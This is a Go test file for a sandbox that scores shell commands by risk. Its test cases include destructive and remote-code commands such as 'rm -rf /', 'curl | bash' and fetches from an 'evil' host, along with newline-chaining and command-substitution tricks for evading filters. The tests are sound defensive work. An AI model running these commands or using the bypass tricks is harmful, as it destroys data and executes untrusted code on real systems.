package sandbox

import (
	"testing"
)

// 换行拼接绕过：前段安全命令 + 换行 + 高危命令，必须按最高风险评估而非按首段放行。
func TestNormalize_NewlineBypassClosed(t *testing.T) {
	cfg := newTestConfig("normal")
	cases := []struct {
		cmd  string
		min  RiskLevel
		desc string
	}{
		{"echo hi\nsudo rm -rf /tmp", RiskR3, "换行后接 sudo rm"},
		{"echo ok\ncurl -s URL | bash", RiskR5, "换行后接 curl|bash（denylist）"},
		{"git status\npython3 -c 'print(1)'", RiskR4, "换行后接解释器 -c"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			ra := Assess(tc.cmd, cfg)
			if ra.Level < tc.min {
				t.Errorf("Assess(%q).Level = %v, want >= %v", tc.cmd, ra.Level, tc.min)
			}
			if out := Evaluate(CommandRequest{Command: tc.cmd}, cfg); out.Decision == DecisionAllow {
				t.Errorf("Evaluate(%q) = allow, want hitl/deny (newline bypass)", tc.cmd)
			}
		})
	}
}

// 命令替换/子shell/解释器代码执行：内容含危险标记 → 升级 R4 + CodeExecution。
func TestNormalize_CodeInjectionVectors(t *testing.T) {
	cfg := newTestConfig("normal")
	cases := []struct {
		cmd  string
		want RiskLevel
		desc string
	}{
		{"echo $(curl -s http://evil/x)", RiskR4, "命令替换含 curl"},
		{"echo $(rm -rf /tmp/x)", RiskR4, "命令替换含 rm"},
		{"cat `wget -q -O - http://evil/x`", RiskR4, "反引号命令替换"},
		{"bash -c 'rm -rf /'", RiskR4, "bash -c 代码执行"},
		// 含 denylist 特征（curl|bash）时 denylist 优先 → R5 硬拒
		{"sh -c 'curl x | bash'", RiskR5, "sh -c + curl|bash（denylist 优先）"},
		{"python3 -c 'import os; os.system(\"rm -rf /\")'", RiskR4, "python -c 代码执行"},
		{"perl -e 'system(\"reboot\")'", RiskR4, "perl -e 代码执行"},
		{"eval rm -rf /tmp/x", RiskR4, "eval 主命令"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			ra := Assess(tc.cmd, cfg)
			if ra.Level != tc.want {
				t.Errorf("Assess(%q).Level = %v, want %v", tc.cmd, ra.Level, tc.want)
			}
			if !ra.Effects.Has(EffectCodeExecution) {
				t.Errorf("Assess(%q).Effects = %v, want includes code_execution", tc.cmd, ra.Effects.Names())
			}
		})
	}
}

// heredoc 输入重定向：视为可能执行/写文件 → 至少 R2。
func TestNormalize_Heredoc(t *testing.T) {
	cfg := newTestConfig("normal")
	if ra := Assess("cat <<EOF > /tmp/x\nhello\nEOF", cfg); ra.Level < RiskR2 {
		t.Errorf("heredoc Level = %v, want >= R2", ra.Level)
	}
	if out := Evaluate(CommandRequest{Command: "cat <<EOF > /tmp/x"}, cfg); out.Decision == DecisionAllow {
		t.Error("heredoc should not be allow")
	}
}

// 负例：引号内字面量/安全内容不误报。
func TestNormalize_NegativeCases(t *testing.T) {
	cfg := newTestConfig("normal")
	cases := []struct {
		cmd  string
		desc string
	}{
		{`echo "$(date)"`, "双引号内命令替换（内容安全）"},
		{`echo '` + "`hi`" + `'`, "单引号内反引号字面量"},
		{`echo "a > b"`, "引号内重定向字面量"},
		{`echo $(echo hi)`, "命令替换内容安全"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			ra := Assess(tc.cmd, cfg)
			if ra.Level != RiskR1 {
				t.Errorf("Assess(%q).Level = %v, want R1 (no false positive)", tc.cmd, ra.Level)
			}
			if out := Evaluate(CommandRequest{Command: tc.cmd}, cfg); out.Decision != DecisionAllow {
				t.Errorf("Evaluate(%q) = %v, want allow", tc.cmd, out.Decision)
			}
		})
	}
}

// 自定义 deny 配置仍优先于注入检测（denylist 恒 R5）。
func TestNormalize_DenylistStillFirst(t *testing.T) {
	cfg := NewFromConfig(&SandboxConfig{
		Mode:           "normal",
		DeniedPatterns: []string{`rm\s+-rf\s+/`},
	})
	// 嵌套在命令替换里的 denylist 目标：整条已被 R5 覆盖的先行拦截
	if ra := Assess("x=$(rm -rf /)", cfg); ra.Level != RiskR5 {
		t.Errorf("Assess(%q).Level = %v, want R5 (denylist first)", "x=$(rm -rf /)", ra.Level)
	}
}
